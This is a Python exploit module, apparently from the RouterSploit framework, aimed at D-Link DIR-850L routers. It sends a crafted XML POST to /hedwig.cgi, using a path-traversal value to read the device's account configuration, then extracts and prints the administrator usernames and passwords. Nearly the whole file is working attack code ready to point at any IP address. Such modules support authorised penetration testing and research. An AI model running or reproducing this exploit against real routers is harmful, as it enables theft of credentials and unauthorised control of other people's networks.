import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DIR-850L Creds Disclosure",
        "description": "Module exploits D-Link DIR-850L credentials disclosure vulnerability, "
                       "which allows retrieving administrative credentials.",
        "authors": (
            "Hack2Win",  # vulnerability discovery
            "GH0st3rs",  # routersploit module
        ),
        "references": (
            "https://packetstormsecurity.com/files/145097/dlink-850-admin-creds-retriever.sh.txt",
            "https://www.rapid7.com/db/modules/exploit/linux/http/dlink_dir850l_unauth_exec",
            "https://blogs.securiteam.com/index.php/archives/3364",
        ),
        "devices": (
            "D-Link DIR-850L",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        self.credentials = []

        if self.check():
            print_success("Target seems to be vulnerable")
            print_table(("Username", "Password"), *self.credentials)

        print_error("Target does not seem to be vulnerable")

    @mute
    def check(self):
        headers = {
            "Content-Type": "text/xml",
        }
        cookies = {
            "uid": utils.random_text(8),
        }
        data = (
            "<?xml version =\"1.0\" encoding=\"utf-8\"?>"
            "<postxml>"
            "<module>"
            "<service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>"
            "</module>"
            "</postxml>"
        )
        response = self.http_request(
            method="POST",
            path="/hedwig.cgi",
            data=data,
            headers=headers,
            cookies=cookies
        )

        if response and response.status_code == 200 and "No modules for Hedwig" in response.text:
            pattern = r"<uid>.*</uid>\s*<name>(.*?)</name>\s*<usrid>.*</usrid>\s*<password>(.*?)</password>"
            creds = re.findall(pattern, response.text)
            if creds:
                self.credentials = creds
                return True

        return False
